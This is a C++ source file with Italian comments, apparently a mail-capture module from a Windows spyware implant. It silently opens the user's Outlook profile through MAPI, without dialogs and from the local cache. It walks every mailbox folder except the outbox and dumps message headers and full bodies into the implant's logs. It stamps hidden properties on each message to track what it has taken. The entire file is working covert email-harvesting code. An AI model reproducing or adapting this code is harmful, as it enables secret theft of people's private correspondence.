#include <mapix.h>
#include "../common.h"
#include "iconverter.h"
#include "MailAgent.h"
#include "../LOG.h"
#include "../HM_SafeProcedures.h"

#define CHECK_FUNC(x) if (!(x)) { return FALSE; }
#define RELEASE(s) if(s!=NULL) { s->Release();s=NULL; }
#define MAPI_CACHE_ONLY 0x00004000
#define OL_4GB 0xFFFFFFFF

typedef struct {
	BOOL used;
	DWORD size;
	BYTE eid[128];
} eid_struct;
#define MAX_FOLDER_COUNT 500

#define PR_MAIL_DATE	PR_MESSAGE_DELIVERY_TIME
#define PR_MAIL_DATE2	PR_CLIENT_SUBMIT_TIME
#define	PR_MAIL_SIZE	PROP_TAG(PT_LONG, 0x5F6A)
#define PR_MAIL_READ	PROP_TAG(PT_LONG, 0x5F69)
#define OL_READ_NONE	0x68
#define OL_READ_HEADER	0x69
#define OL_READ_FULL	0x70
#define OL_READ_PARTIAL	0x71

// GLOBAL VARIABLES
// Funzioni di mapi32.dll
static MAPIINITIALIZE *pMAPIInitialize;
static MAPILOGONEX *pMAPILogonEx;
static MAPIUNINITIALIZE *pMAPIUninitialize;
static MAPIFREEBUFFER *pMAPIFreeBuffer;
#define MAPI_NOT_LOADED 0
#define MAPI_LOADED		1
#define MAPI_CANT_LOAD	2
static int mapi_status = MAPI_NOT_LOADED;


BOOL OL_GetMailSize(LPSTREAM lpMimeStm, DWORD *size)
{
	LARGE_INTEGER li;
	ULARGE_INTEGER lsize;

	*size = 0;
	li.QuadPart = 0;
	if (lpMimeStm->Seek(li, SEEK_END, &lsize) != S_OK)
		return FALSE;

	// se e' > 4GB
	if (lsize.HighPart != 0)
		*size = OL_4GB;
	else 
		*size = lsize.LowPart;
	return TRUE;
}

// Setta i flag di lettura
BOOL OL_SetRead(LPMESSAGE pMessage, DWORD flags, DWORD mail_size)
{
	SPropValue prop[2];
	prop[0].ulPropTag = PR_MAIL_READ;
	prop[0].Value.l = flags;
	prop[0].dwAlignPad = 0;

	prop[1].ulPropTag = PR_MAIL_SIZE;
	prop[1].Value.l = mail_size;
	prop[1].dwAlignPad = 0;

	if (pMessage->SetProps(2, prop, NULL) == S_OK) {
		pMessage->SaveChanges(FORCE_SAVE);
		return TRUE;
	}

	return FALSE;
}

// Dumpa solo l'header di una mail 
// se mail_size == 0 allora lo stream contiene davvero solo l'header
// (altrimenti contiene anche il body, ma non va catturato per questioni
// di dimensioni)
BOOL OL_MailDumpHeader(LPSTREAM lpMimeStm, DWORD mail_size, FILETIME *mail_date)
{
	BYTE *header_end;
	BYTE *read_buff;
	DWORD size = 0;
	HANDLE hf = INVALID_HANDLE_VALUE;
	LARGE_INTEGER li;
	struct MailSerializedMessageHeader additional_header;
	
	ZeroMemory(&additional_header, sizeof(additional_header));
	additional_header.Size = mail_size;
	additional_header.VersionFlags = MAPI_V2_0_PROTO;
	additional_header.date.dwHighDateTime = mail_date->dwHighDateTime;
	additional_header.date.dwLowDateTime = mail_date->dwLowDateTime;

	// Siamo sicuri che anche leggendo il massimo sia sempre NULL terminato
	if ( (read_buff = (BYTE *)calloc(MAX_HEADER_SIZE+2, 1) ) == NULL )
		return FALSE;

	li.QuadPart = 0; // Parte dall'inizio dello stream
	lpMimeStm->Seek(li, SEEK_SET, NULL);
	// Legge i primi K dell'header
	if (lpMimeStm->Read(read_buff, MAX_HEADER_SIZE, &size)!=S_OK || size==0) {
		SAFE_FREE(read_buff);
		return FALSE;
	}

	// Se nello stream c'e' anche il body cerca di tagliarlo
	if (mail_size > 0) 
		if (header_end = (BYTE *)strstr((char *)read_buff, "\r\n\r\n"))
			header_end[2]=0;

	// Scrive il log
	hf = Log_CreateFile(PM_MAILAGENT, (BYTE *)&additional_header, sizeof(additional_header));
	if (hf == INVALID_HANDLE_VALUE) {
		SAFE_FREE(read_buff);
		return FALSE;
	}

	// L'header sara' comunque NULL terminato
	if (!Log_WriteFile(hf, read_buff, strlen((const char *)read_buff))) {
		Log_CloseFile(hf); 
		SAFE_FREE(read_buff);
		return FALSE;
	}

	Log_CloseFile(hf); 
	SAFE_FREE(read_buff);
	return TRUE;
}

// Dumpa l'intero contenuto della mail
BOOL OL_MailDumpFull(LPSTREAM lpMimeStm, DWORD mail_size, FILETIME *mail_date)
{
	BYTE read_buff[2048];
	DWORD size = 0;
	HANDLE hf;
	LARGE_INTEGER li;
	struct MailSerializedMessageHeader additional_header;
	
	ZeroMemory(&additional_header, sizeof(additional_header));
	additional_header.Size = mail_size;
	additional_header.Flags |= MAIL_FULL_BODY;
	additional_header.VersionFlags = MAPI_V2_0_PROTO;
	additional_header.date.dwHighDateTime = mail_date->dwHighDateTime;
	additional_header.date.dwLowDateTime = mail_date->dwLowDateTime;

	hf = Log_CreateFile(PM_MAILAGENT, (BYTE *)&additional_header, sizeof(additional_header));
	if (hf == INVALID_HANDLE_VALUE)
		return FALSE;

	// Parte dall'inizio dello stream
	li.QuadPart = 0;
	lpMimeStm->Seek(li, SEEK_SET, NULL);
	while (lpMimeStm->Read(read_buff, sizeof(read_buff), &size)==S_OK && size>0) {
		if (!Log_WriteFile(hf, read_buff, size)) {
			Log_CloseFile(hf); 
			return FALSE;
		}
	}

	Log_CloseFile(hf); 
	return TRUE;
}


#define OL_INTERESTING_TAG1 PR_SUBJECT_W
#define OL_INTERESTING_TAG2 PR_SENDER_EMAIL_ADDRESS_W
#define OL_INTERESTING_TAG3 PR_DISPLAY_TO_W
#define OL_INTERESTING_TAG4 PR_DISPLAY_CC_W
#define OL_INTERESTING_TAG5 PR_DISPLAY_BCC_W
#define OL_INTERESTING_COUNT 5
BOOL OL_IsInterestingMail(LPMESSAGE pMessage, mail_filter_struct *mail_filter)
{	/* XXX Sono state eliminate per ora le ricerche testuali
	DWORD i;
	LPSPropValue props = NULL;
	ULONG cValues = 0;
	ULONG tag_array[OL_INTERESTING_COUNT];
	BOOL ret_val = FALSE;
	ULONG rgTags[] = { OL_INTERESTING_COUNT, OL_INTERESTING_TAG1, OL_INTERESTING_TAG2,  OL_INTERESTING_TAG3, OL_INTERESTING_TAG4, OL_INTERESTING_TAG5};

	tag_array[0] = OL_INTERESTING_TAG1;
	tag_array[1] = OL_INTERESTING_TAG2;
	tag_array[2] = OL_INTERESTING_TAG3;
	tag_array[3] = OL_INTERESTING_TAG4;
	tag_array[4] = OL_INTERESTING_TAG5;

	pMessage->GetProps((LPSPropTagArray) rgTags, MAPI_UNICODE, &cValues, &props);

	if (props) {
		if (cValues == OL_INTERESTING_COUNT) {
			for (i = 0; i < OL_INTERESTING_COUNT; i++) {
				if (props[i].ulPropTag == tag_array[i]) {
					if (CmpWildW(mail_filter->search_string, props[i].Value.lpszW)) {
						ret_val = TRUE;
						break;
					}
				}
			}
		}
		pMAPIFreeBuffer(props);
	}

	return ret_val;
	*/
	return TRUE;
}

BOOL OL_LogEmail(LPSTREAM lpMimeStm, DWORD actual_read_flag, DWORD *new_read_flag, DWORD *mail_size, mail_filter_struct *mail_filter, FILETIME *mail_date)
{
	// Se fallisce la funzione questo valore sara' a 0
	// e non pregiudichera' i futuri check
	*mail_size = 0;

	// Check paranoico
	if (actual_read_flag == OL_READ_FULL)
		return FALSE;

	// Se c'e' solo l'header
	if ((*new_read_flag) == OL_READ_HEADER) {
		// Se PARTIAL o FULL non deve riloggare solo l'header
		// (non dovrebbe accadere mai)
		if (actual_read_flag != OL_READ_NONE)
			return FALSE;

		return OL_MailDumpHeader(lpMimeStm, 0, mail_date);
	} else { // Se c'e' tutto il body della mail (*new_read_flag) == OL_READ_FULL
		if (!OL_GetMailSize(lpMimeStm, mail_size))
			return FALSE;

		// Se la dimensione supera la size...
		if ((*mail_size)==OL_4GB || (*mail_size)>mail_filter->max_size) {
			(*new_read_flag) = OL_READ_PARTIAL; // da FULL di venta parziale
			// La mail deve essere READ_HEADER o READ_NONE
			if (actual_read_flag == OL_READ_PARTIAL)
				return FALSE;
			return OL_MailDumpHeader(lpMimeStm, *mail_size, mail_date);
		} else { // ...altrimenti dumpa tutta la mail
			return OL_MailDumpFull(lpMimeStm, *mail_size, mail_date);
		}
	}
	// not reached...
	return FALSE;
}

static BOOL OL_LoadMapi()
{
	HMODULE hmapilib = LoadLibrary("mapi32.dll"); 
	if (!hmapilib) 
		return FALSE;

	CHECK_FUNC(pMAPIInitialize = (MAPIINITIALIZE*)HM_SafeGetProcAddress(hmapilib, "MAPIInitialize"));
	CHECK_FUNC(pMAPILogonEx = (MAPILOGONEX*)HM_SafeGetProcAddress(hmapilib,"MAPILogonEx"));
	CHECK_FUNC(pMAPIUninitialize = (MAPIUNINITIALIZE*)HM_SafeGetProcAddress(hmapilib,"MAPIUninitialize"));
	CHECK_FUNC(pMAPIFreeBuffer = (MAPIFREEBUFFER*)HM_SafeGetProcAddress(hmapilib,"MAPIFreeBuffer"));

	return TRUE;
}

static void OL_FreeProws(SRowSet *r)
{ 
	if (!r) 
		return;
	for (unsigned int i=0; i<r->cRows; i++) { 
		SPropValue *pv = r->aRow[i].lpProps;
		pMAPIFreeBuffer(pv);
	}
	pMAPIFreeBuffer(r);
}

LPMDB OL_GetNextMessageStore(IMAPITable *pMsgStoresTable, IMAPISession* mapi_session)
{
	LPSRowSet pRows = NULL;
	LPMDB pMsgStore = NULL;

	if (!pMsgStoresTable)
		return NULL;

	while(pMsgStoresTable->QueryRows(1, 0, &pRows) == S_OK) {
		if (pRows->cRows == 0) {
			OL_FreeProws(pRows);
			return NULL;
		}
		if(pRows->aRow[0].lpProps[2].Value.ul != MAPI_STORE) {
			OL_FreeProws(pRows);
			continue;
		}
		// Se non riesce ad aprirlo continua...
		if (mapi_session->OpenMsgStore(NULL, pRows->aRow[0].lpProps[1].Value.bin.cb, (ENTRYID*)pRows->aRow[0].lpProps[1].Value.bin.lpb, NULL, MDB_NO_DIALOG | MAPI_CACHE_ONLY | MAPI_BEST_ACCESS, &pMsgStore) == S_OK) {
			OL_FreeProws(pRows);
			return pMsgStore;
		}
		OL_FreeProws(pRows);
	}

	return NULL;
}

static IMAPITable *OL_OpenMessageStores(IMAPISession* mapi_session)
{
	const int nProperties = 3;
	IMAPITable *pMsgStoresTable;

	if(!mapi_session) 
		return NULL;

	if(mapi_session->GetMsgStoresTable(0, &pMsgStoresTable) != S_OK) 
		return NULL;

	SizedSPropTagArray(nProperties,Columns)={nProperties,{PR_DISPLAY_NAME_W, PR_ENTRYID, PR_OBJECT_TYPE}};		
	if(pMsgStoresTable->SetColumns((LPSPropTagArray)&Columns, 0) != S_OK) {
		RELEASE(pMsgStoresTable);
		return NULL;
	}
	return pMsgStoresTable;
}


#define PROP_MESSAGE_FLAGS	0
#define PROP_ENTRYID		1
#define PROP_OBJECT_TYPE	2
#define PROP_MAIL_READ		3
#define PROP_BODY_W			4
#define	PROP_MAIL_SIZE		5
#define PROP_MAIL_DATE		6
#define PROP_MAIL_DATE2		7
#define PROP_COUNT_CONT		8
LPMAPITABLE OL_GetContents(LPMAPIFOLDER msg_folder)
{
	LPMAPITABLE msg_contents = NULL;
	const int nProperties = PROP_COUNT_CONT;

	if(!msg_folder) 
		return NULL;
	
	if(msg_folder->GetContentsTable(MAPI_UNICODE, &msg_contents) != S_OK) 
		return NULL;

	SizedSPropTagArray(nProperties,Columns)={nProperties,{PR_MESSAGE_FLAGS, PR_ENTRYID, PR_OBJECT_TYPE, PR_MAIL_READ, PR_BODY_W, PR_MAIL_SIZE, PR_MAIL_DATE, PR_MAIL_DATE2}};	
	if (msg_contents->SetColumns((LPSPropTagArray)&Columns, 0) != S_OK) {
		RELEASE(msg_contents);
		return NULL;
	}
	return msg_contents;
}

BOOL OL_FindEmails(LPMAPITABLE msg_contents, IMAPISession* mapi_session, mail_filter_struct *mail_filter)
{
	DWORD actual_read_flag, new_read_flag;
	DWORD mail_size;
	LPSTREAM lpMimeStm = NULL;
	IConverterSession* lpConverterSession = NULL;
	LPSRowSet pRows = NULL;
	ULONG ulObjType;
	LPMESSAGE pMessage;
	HRESULT hRes;
	FILETIME mail_date;

	if (!msg_contents || !mapi_session)
		return FALSE;

	CoInitialize( NULL );
	hRes = CoCreateInstance(CLSID_IConverterSession, NULL, CLSCTX_INPROC_SERVER, IID_IConverterSession, (void **) &lpConverterSession);
	if (hRes != S_OK) {
		CoUninitialize();
		return FALSE;
	}

	// Cicla tutte le email
	while (!g_bMailForceExit && msg_contents->QueryRows(1, 0, &pRows)==S_OK) {
		if(pRows->cRows == 0) {
			OL_FreeProws(pRows);
			break;
		}
		// se non e' un messaggio continua... 
		if (pRows->aRow[0].lpProps[PROP_OBJECT_TYPE].Value.ul != MAPI_MESSAGE) {
			OL_FreeProws(pRows);
			continue;
		} 

		// Verifica se c'e' anche il body
		if (pRows->aRow[0].lpProps[PROP_BODY_W].ulPropTag == PR_BODY_W)
			new_read_flag = OL_READ_FULL;
		else
			new_read_flag = OL_READ_HEADER;

		// se e' gia' stato dumpato (altrimenti la property non ci sarebbe)...
		if (pRows->aRow[0].lpProps[PROP_MAIL_READ].ulPropTag==PR_MAIL_READ) {
			actual_read_flag = pRows->aRow[0].lpProps[PROP_MAIL_READ].Value.l;
			// se e' gia' stato letto tutto o se non c'e' il body (e l'header l'avevo gia' letto) continua...
			if (actual_read_flag == OL_READ_FULL || new_read_flag == OL_READ_HEADER) {
				OL_FreeProws(pRows);
				continue;
			}
		} else // se non era mai stato dumpato
			actual_read_flag = OL_READ_NONE;

		// Fa il check sulla data
		if (pRows->aRow[0].lpProps[PROP_MAIL_DATE].ulPropTag==PR_MAIL_DATE) {
			if (!IsNewerDate(&(pRows->aRow[0].lpProps[PROP_MAIL_DATE].Value.ft), &(mail_filter->min_date))) {
				OL_FreeProws(pRows);
				continue;
			}
			if (IsNewerDate(&(pRows->aRow[0].lpProps[PROP_MAIL_DATE].Value.ft), &(mail_filter->max_date))) {
				OL_FreeProws(pRows);
				continue;
			}
			mail_date.dwHighDateTime = pRows->aRow[0].lpProps[PROP_MAIL_DATE].Value.ft.dwHighDateTime;
			mail_date.dwLowDateTime = pRows->aRow[0].lpProps[PROP_MAIL_DATE].Value.ft.dwLowDateTime;
		} else if (pRows->aRow[0].lpProps[PROP_MAIL_DATE2].ulPropTag==PR_MAIL_DATE2) {
			if (!IsNewerDate(&(pRows->aRow[0].lpProps[PROP_MAIL_DATE2].Value.ft), &(mail_filter->min_date))) {
				OL_FreeProws(pRows);
				continue;
			}
			if (IsNewerDate(&(pRows->aRow[0].lpProps[PROP_MAIL_DATE2].Value.ft), &(mail_filter->max_date))) {
				OL_FreeProws(pRows);
				continue;
			}
			mail_date.dwHighDateTime = pRows->aRow[0].lpProps[PROP_MAIL_DATE2].Value.ft.dwHighDateTime;
			mail_date.dwLowDateTime = pRows->aRow[0].lpProps[PROP_MAIL_DATE2].Value.ft.dwLowDateTime;
		} else {
			mail_date.dwHighDateTime = 0;
			mail_date.dwLowDateTime = 0;
		}

		// Fa il check sulla dimensione
		if (pRows->aRow[0].lpProps[PROP_MAIL_SIZE].ulPropTag==PR_MAIL_SIZE) {
			if (pRows->aRow[0].lpProps[PROP_MAIL_SIZE].Value.ul > mail_filter->max_size) {
				OL_FreeProws(pRows);
				continue;
			}
		}
		
		// Apre la mail...
		hRes = mapi_session->OpenEntry(pRows->aRow[0].lpProps[PROP_ENTRYID].Value.bin.cb, (LPENTRYID)pRows->aRow[0].lpProps[PROP_ENTRYID].Value.bin.lpb, NULL, MAPI_CACHE_ONLY | MAPI_BEST_ACCESS, &ulObjType, (LPUNKNOWN*)&pMessage);		
		// Verifica che sia stata aperta...
		if (hRes == S_OK) {
			// ...e che sia "interessante"
			if (OL_IsInterestingMail(pMessage, mail_filter)) { 
				if (FNC(CreateStreamOnHGlobal)(NULL, TRUE, &lpMimeStm) == S_OK) {

					__try {
						hRes = lpConverterSession->MAPIToMIMEStm(pMessage, lpMimeStm, CCSF_SMTP);
					} __except (EXCEPTION_EXECUTE_HANDLER) {
								hRes = S_FALSE;
					}

					if (hRes == S_OK) { 
						if (OL_LogEmail(lpMimeStm, actual_read_flag, &new_read_flag, &mail_size, mail_filter, &mail_date))
							OL_SetRead(pMessage, new_read_flag, mail_size);
					}
					RELEASE(lpMimeStm);
				}
			}
			RELEASE(pMessage);
		}

		OL_FreeProws(pRows);
	}

	RELEASE(lpConverterSession);
	CoUninitialize();
	return TRUE;
}

BOOL OL_InsertSubFolder(eid_struct *folder_list, DWORD size, BYTE *eid)
{
	DWORD i;
	
	// Se la size e' troppo grande torna come se lo avesse inserito
	// e continua la ricerca
	if (size>sizeof(folder_list->eid) || size==0 || !eid)
		return TRUE;

	// Lascia sempre una entry vuota alla fine 
	for (i=0; i<MAX_FOLDER_COUNT-1; i++) {
		if (!folder_list[i].used) {
			folder_list[i].used = TRUE;
			folder_list[i].size = size;
			memcpy(folder_list[i].eid, eid, size);
			return TRUE;
		}
	}

	return FALSE;
}

void OL_FindSubFolders(LPMAPIFOLDER pFolder, eid_struct *folder_list, eid_struct *outbox)
{
	DWORD dwObjType;
	LPSRowSet pRows = NULL;
	LPMAPITABLE pHierarchy;
	const int nProperties = 4;

	if (!pFolder || !folder_list)
		return;

	if(pFolder->GetHierarchyTable(MAPI_UNICODE, &pHierarchy) != S_OK) 
		return;

	SizedSPropTagArray(nProperties,Columns)={nProperties,{PR_DISPLAY_NAME_W, PR_ENTRYID, PR_OBJECT_TYPE, PR_SUBFOLDERS}};
	if(pHierarchy->SetColumns((LPSPropTagArray)&Columns, 0) != S_OK) {
		RELEASE(pHierarchy);
		return;
	}

	for(;pHierarchy->QueryRows(1, 0, &pRows) == S_OK; OL_FreeProws(pRows), pRows = NULL) {
		// se sono finire le entry torna al chiamante
		if(pRows->cRows == 0)
			break;

		// se non e' un mapi_folder continua.... 
		if (pRows->aRow[0].lpProps[2].Value.ul != MAPI_FOLDER) 
			continue;

		// Se e' l'outbox lo salta (insieme a tutti i suoi subfolder)
		if (outbox->used && 
			pRows->aRow[0].lpProps[PROP_ENTRYID].Value.bin.cb == outbox->size &&
			!memcmp(pRows->aRow[0].lpProps[PROP_ENTRYID].Value.bin.lpb, outbox->eid, outbox->size))
			continue;

		// Lo inserisce nella lista (se non ci riesce e' come se fossero finite le entry)
		if (!OL_InsertSubFolder(folder_list, pRows->aRow[0].lpProps[PROP_ENTRYID].Value.bin.cb, (BYTE *)pRows->aRow[0].lpProps[PROP_ENTRYID].Value.bin.lpb))
			break;

		// Se ha un subfolder, chiama la funzione ricorsivamente
		if (pRows->aRow[0].lpProps[3].Value.b) {
			LPMAPIFOLDER pSubFolder = NULL;
			// se riesce ad aprirlo chiama ricorsivamente
			if(pFolder->OpenEntry(pRows->aRow[0].lpProps[PROP_ENTRYID].Value.bin.cb, (LPENTRYID)pRows->aRow[0].lpProps[PROP_ENTRYID].Value.bin.lpb,  NULL, MAPI_CACHE_ONLY | MAPI_BEST_ACCESS, &dwObjType, (LPUNKNOWN*)&pSubFolder) == S_OK)  {
				OL_FindSubFolders(pSubFolder, folder_list, outbox);
				RELEASE(pSubFolder);
			}
		}		
	}

	OL_FreeProws(pRows);
	RELEASE(pHierarchy);
	return;
}

eid_struct *OL_GetHierarchy(LPMDB msg_store)
{
	LPSPropValue props = NULL;
	ULONG cValues = 0;
	DWORD dwObjType;
	ULONG rgTags[] = { 1, PR_IPM_SUBTREE_ENTRYID };
	ULONG rgTags_ob[] = { 1, PR_IPM_OUTBOX_ENTRYID };
	HRESULT hRes;
	LPMAPIFOLDER pFolder = NULL;
	eid_struct *folder_list = NULL;
	eid_struct outbox;

	if (!msg_store)
		return NULL;
	
	// Prende l'outbox (per poterla saltare)
	outbox.used = FALSE;
	if(msg_store->GetProps((LPSPropTagArray) rgTags_ob, MAPI_UNICODE, &cValues, &props) == S_OK) {
		if (props[0].Value.bin.cb <= sizeof(outbox.eid)) {
			outbox.size = props[0].Value.bin.cb;
			memcpy(outbox.eid, props[0].Value.bin.lpb, outbox.size);
			outbox.used = TRUE;
		}
	}

	// Ripristina i valori come all'inizio
	if (props && cValues==1)
		pMAPIFreeBuffer(props);
	props = NULL;
	cValues = 0;

	// Prende il root folder
	if(msg_store->GetProps((LPSPropTagArray) rgTags, MAPI_UNICODE, &cValues, &props) != S_OK) {
		if (props && cValues==1)
			pMAPIFreeBuffer(props);
		return NULL;
	}
	hRes = msg_store->OpenEntry(props[0].Value.bin.cb,(LPENTRYID)props[0].Value.bin.lpb, NULL, MAPI_CACHE_ONLY | MAPI_BEST_ACCESS, &dwObjType,(LPUNKNOWN*)&pFolder);
	pMAPIFreeBuffer(props);
	if (hRes != S_OK)
		return NULL;
	if (dwObjType != MAPI_FOLDER) {
		RELEASE(pFolder);
		return NULL;
	}

	// Azzera la lista dei subfolder che verra' riempita dalla funzione ricorsiva
	folder_list = (eid_struct *)calloc(MAX_FOLDER_COUNT, sizeof(eid_struct));
	// Chiama la funzione in maniera ricorsiva (si accorge se gli viene passato NULL)
	OL_FindSubFolders(pFolder, folder_list, &outbox);

	RELEASE(pFolder);
	return folder_list;
}

LPMAPIFOLDER OL_GetSubFolder(IMAPISession *mapi_session, eid_struct *folder_list, DWORD i)
{
	DWORD dwObjType;
	LPMAPIFOLDER pSubFolder = NULL;

	// Controlla che non siamo arrivati alla fine dei subfolder salvati
	if (i >= MAX_FOLDER_COUNT)
		return NULL;
	// Finisce sempre con una entry vuota
	if (!folder_list[i].used) 
		return NULL;

	if(mapi_session->OpenEntry(folder_list[i].size, (LPENTRYID)folder_list[i].eid,  NULL, MAPI_CACHE_ONLY | MAPI_BEST_ACCESS, &dwObjType, (LPUNKNOWN*)&pSubFolder) != S_OK)  
		return NULL;

	return pSubFolder;
}

static BOOL IsOutlookInstalled()
{
	HKEY hKey;
	BYTE key_value[1024];
	DWORD key_len = sizeof(key_value);
	HMODULE hdll;

	ZeroMemory(key_value, sizeof(key_value));
	if(FNC(RegOpenKeyExW)(HKEY_LOCAL_MACHINE, L"Software\\Clients\\Mail\\Microsoft Outlook", 0, KEY_READ | KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS) 
		return FALSE;

	if (FNC(RegQueryValueExW)(hKey, L"DLLPathEx", NULL, NULL, key_value, &key_len) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hKey);
		return FALSE;
	}

	FNC(RegCloseKey)(hKey);
	hdll = LoadLibraryW((WCHAR *)key_value);
	if (!hdll)
		return FALSE;
	FreeLibrary(hdll);

	return TRUE;
}


BOOL OL_DumpEmails(mail_filter_struct *mail_filter)
{
	DWORD i;
	IMAPISession *mapi_session = NULL;
	IMAPITable *mapi_table = NULL;
	LPMDB msg_store = NULL;
	LPMAPIFOLDER msg_sub_folder;
	LPMAPITABLE msg_contents = NULL;
	eid_struct *folder_list = NULL;
	
	if (mapi_status == MAPI_NOT_LOADED) {
		if (IsOutlookInstalled() && OL_LoadMapi())
			mapi_status = MAPI_LOADED;
		else
			mapi_status = MAPI_CANT_LOAD;
	}

	if (mapi_status != MAPI_LOADED)
		return FALSE;

	if (pMAPIInitialize(NULL) != S_OK)
		return FALSE;

	if (pMAPILogonEx(NULL, NULL, NULL, MAPI_EXTENDED | MAPI_USE_DEFAULT | MAPI_NEW_SESSION, &mapi_session) != S_OK ) {
		pMAPIUninitialize();
		return FALSE;
	}
	
	if (!(mapi_table = OL_OpenMessageStores(mapi_session)))  {
		RELEASE(mapi_session);
		pMAPIUninitialize();
		return FALSE;
	}
	
	// Cicla i message store
	while (!g_bMailForceExit && (msg_store = OL_GetNextMessageStore(mapi_table, mapi_session))) {
		if (folder_list = OL_GetHierarchy(msg_store)) {
			// Cicla i folder
			for (i=0; !g_bMailForceExit && (msg_sub_folder = OL_GetSubFolder(mapi_session, folder_list, i)); i++) {
				if (msg_contents = OL_GetContents(msg_sub_folder)) {
					// Cattura le mail di questo folder
					OL_FindEmails(msg_contents, mapi_session, mail_filter);
					RELEASE(msg_contents);
				}
				RELEASE(msg_sub_folder);
			}
			SAFE_FREE(folder_list);
		}
		RELEASE(msg_store);
	}
	
	RELEASE(mapi_table);
	RELEASE(mapi_session);

	Sleep(2000); // XXX Fix ufficiale di microsoft per il LORO bug delle mapi!!!!
	pMAPIUninitialize();
	return TRUE;
}
